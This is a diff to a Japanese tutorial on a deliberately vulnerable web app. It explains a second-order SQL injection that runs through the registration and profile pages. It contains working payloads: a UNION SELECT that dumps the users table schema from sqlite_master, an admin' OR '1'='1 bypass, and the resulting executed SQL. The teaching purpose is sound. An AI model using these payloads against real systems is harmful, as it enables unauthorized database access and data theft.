@@ -186,12 +186,21 @@ $posts = DB::select(
 
 ### Second-order SQLi（/register → /profile）
 ```
--- Step 1: ペイロードをユーザー名として登録
-username: ' UNION SELECT 1,2,sql,4,5 FROM sqlite_master WHERE name='users' --
+-- Step 1: ペイロードをユーザー名として登録（シングルクォートは '' で二重にする）
+username: '' UNION SELECT 1,2,sql,4,5 FROM sqlite_master WHERE name=''users'' --
 email: test@example.com
 
+-- ⚠️ なぜシングルクォートを2個ずつ書くのか
+-- INSERT文の文字列リテラル内では '' がエスケープされた ' として解釈される。
+-- 登録フォームに '' と入力すると、usersテーブルには ' として保存される。
+-- /profile/{id} でこの値が再度クエリに文字列結合されると、本物の ' として SQLi が発火する。
+-- これが Second-order（二段階）の核心: 無害に見えた入力が、別の文脈で武器になる。
+-- ※ admin'' OR ''1''=''1 と入力すれば、DB保存後は admin' OR '1'='1 になる（READMEのペイロード参照）
+
 -- Step 2: /profile/{id} にアクセスすると、
--- usernameがpostsテーブルへのクエリに展開されて発火
+-- usernameがpostsテーブルへのクエリに文字列結合されて発火
+-- 実行されるSQL（発火後）:
+--   SELECT * FROM posts WHERE author = '' UNION SELECT 1,2,sql,4,5 FROM sqlite_master WHERE name='users' --'
 ```
 
 ## 6. 対策の解説（記事末尾で示すコード）
